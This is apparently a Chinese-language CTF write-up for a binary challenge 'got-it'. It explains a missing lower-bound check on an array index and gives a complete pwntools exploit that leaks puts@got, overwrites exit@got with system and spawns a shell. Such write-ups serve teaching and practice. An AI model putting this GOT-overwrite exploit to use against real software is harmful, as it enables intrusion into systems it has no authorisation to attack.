# got-it

## 题目简述

全局数组为 `char list[0x10][8]`，新增、查看和编辑功能只检查 `idx >= 0x10`，没有检查 `idx < 0`。负数下标会访问数组之前的 `.bss`/GOT 区域，形成任意相对地址读写。二进制采用 Partial RELRO，GOT 仍可写；隐藏菜单还会执行 `exit("/bin/sh")`。

## 解题过程

数组每项 8 字节，因此可根据 `目标地址 - list地址` 计算负索引。题目二进制的布局中：

- `show(-17)` 读取 `puts@got`，泄露 libc 中 `puts` 的运行时地址；
- 用泄露值减去配套 libc 的 `puts` 偏移，得到 libc 基址；
- `edit(-11, ...)` 覆盖 `exit@got` 为 `system`；
- 选择隐藏菜单 `0x2023`，`trick()` 原本执行的 `exit("/bin/sh")` 便被重定向为 `system("/bin/sh")`。

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/got-it")
libc = ELF("../dist/libc.so.6")

def menu(choice):
    io.sendlineafter(b">> ", str(choice).encode())

def show(idx):
    menu(2)
    io.sendlineafter(b"id: ", str(idx).encode())
    io.recvuntil(b"name: ")
    return io.recvline().rstrip(b"\n")

def edit(idx, data):
    menu(3)
    io.sendlineafter(b"id: ", str(idx).encode())
    io.sendafter(b"name: ", data)

puts_addr = u64(show(-17).ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]
edit(-11, p64(libc.sym["system"])[:6])
menu(0x2023)
io.interactive()
```

只写低 6 字节是因为常见 x86-64 用户态地址的高两字节为零，同时避免输入接口带来的额外字节影响；具体长度仍应以目标地址和写入原语为准。

## 方法总结

数组边界检查必须同时验证下界与上界。利用 GOT 覆写时还需确认 RELRO 状态、目标表项是否已解析、调用点的参数是否与替换函数兼容。本题选择 `exit` 是因为隐藏分支已经把 `/bin/sh` 指针作为第一个参数传入，改成 `system` 后参数可直接复用。
